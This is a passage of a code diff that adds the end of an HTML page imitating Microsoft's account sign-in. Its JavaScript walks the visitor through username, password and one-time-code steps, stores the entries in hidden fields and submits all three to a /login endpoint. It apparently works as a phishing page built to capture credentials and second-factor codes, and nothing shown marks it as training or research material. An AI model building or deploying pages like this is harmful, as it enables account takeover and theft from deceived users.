+                <p class="mb-16"> <a href="#" class="link fs-13">Resend OTP</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to verify</a>
+                </p>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>. . .</span>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const unReq = "Enter a valid email address, phone number, or Skype name.";
+            const pwdReq = "Please enter the password for your Microsoft account.";
+            const otpReq = "Please enter the OTP sent to your email or phone.";
+            const unameInp = document.getElementById('inp_uname');
+            const pwdInp = document.getElementById('inp_pwd');
+            const otpInp = document.getElementById('OTP_m');
+            const hiddenUname = document.getElementById('hidden_uname');
+            const hiddenUnameOtp = document.getElementById('hidden_uname_otp');
+            const hiddenPwdOtp = document.getElementById('hidden_pwd_otp');
+            const unameForm = document.getElementById('uname_form');
+            const pwdForm = document.getElementById('pwd_form');
+            const otpForm = document.getElementById('otp_form');
+            const nextBtnUname = document.getElementById('btn_next_uname');
+            const nextBtnPwd = document.getElementById('btn_next_pwd');
+            const backToUname = document.getElementById('back_to_uname');
+            const backToPwd = document.getElementById('back_to_pwd');
+            let view = "uname";
+
+            function validateUname() {
+                if (unameInp.value.trim() === "") {
+                    document.getElementById('error_uname').innerText = unReq;
+                    unameInp.classList.add('error-inp');
+                    return false;
+                } else {
+                    document.getElementById('error_uname').innerText = "";
+                    unameInp.classList.remove('error-inp');
+                    return true;
+                }
+            }
+
+            function validatePwd() {
+                if (pwdInp.value.trim() === "") {
+                    document.getElementById('error_pwd').innerText = pwdReq;
+                    pwdInp.classList.add('error-inp');
+                    return false;
+                } else {
+                    document.getElementById('error_pwd').innerText = "";
+                    pwdInp.classList.remove('error-inp');
+                    return true;
+                }
+            }
+
+            function validateOtp() {
+                if (otpInp.value.trim() === "") {
+                    document.getElementById('error_otp').innerText = otpReq;
+                    otpInp.classList.add('error-inp');
+                    return false;
+                } else {
+                    document.getElementById('error_otp').innerText = "";
+                    otpInp.classList.remove('error-inp');
+                    return true;
+                }
+            }
+
+            nextBtnUname.addEventListener('click', (e) => {
+                e.preventDefault();
+                console.log('Next button (username) clicked');
+                if (validateUname()) {
+                    hiddenUname.value = unameInp.value;
+                    hiddenUnameOtp.value = unameInp.value;
+                    document.getElementById('section_uname').classList.add('d-none');
+                    document.getElementById('section_pwd').classList.remove('d-none');
+                    document.getElementById('user_identity').innerText = unameInp.value;
+                    view = "pwd";
+                    console.log('Navigated to password section');
+                } else {
+                    console.log('Username validation failed');
+                }
+            });
+
+            unameForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                console.log('uname_form submit prevented');
+            });
+
+            nextBtnPwd.addEventListener('click', (e) => {
+                e.preventDefault();
+                console.log('Next button (password) clicked');
+                if (validatePwd()) {
+                    hiddenPwdOtp.value = pwdInp.value;
+                    document.getElementById('section_pwd').classList.add('d-none');
+                    document.getElementById('section_otp').classList.remove('d-none');
+                    document.getElementById('user_identity_otp').innerText = unameInp.value;
+                    view = "otp";
+                    console.log('Navigated to OTP section');
+                } else {
+                    console.log('Password validation failed');
+                }
+            });
+
+            pwdForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                console.log('pwd_form submit prevented');
+            });
+
+            otpForm.addEventListener('submit', (e) => {
+                if (!validateOtp()) {
+                    e.preventDefault();
+                    console.log('OTP validation failed');
+                } else {
+                    console.log('Submitting to /login:', {
+                        username: hiddenUnameOtp.value,
+                        password: hiddenPwdOtp.value,
+                        otp: otpInp.value
+                    });
+                }
+            });
+
+            backToUname.addEventListener('click', () => {
+                view = "uname";
+                document.getElementById('section_pwd').classList.add('d-none');
+                document.getElementById('section_uname').classList.remove('d-none');
+                pwdInp.value = "";
+                document.getElementById('error_pwd').innerText = "";
+                pwdInp.classList.remove('error-inp');
+                console.log('Returned to username section');
+            });
+
+            backToPwd.addEventListener('click', () => {
+                view = "pwd";
+                document.getElementById('section_otp').classList.add('d-none');
+                document.getElementById('section_pwd').classList.remove('d-none');
+                otpInp.value = "";
+                document.getElementById('error_otp').innerText = "";
+                otpInp.classList.remove('error-inp');
+                console.log('Returned to password section');
+            });
+
+            unameInp.addEventListener('input', validateUname);
+            pwdInp.addEventListener('input', validatePwd);
+            otpInp.addEventListener('input', validateOtp);
+        });
+    </script>
+</body>
+</html>
+
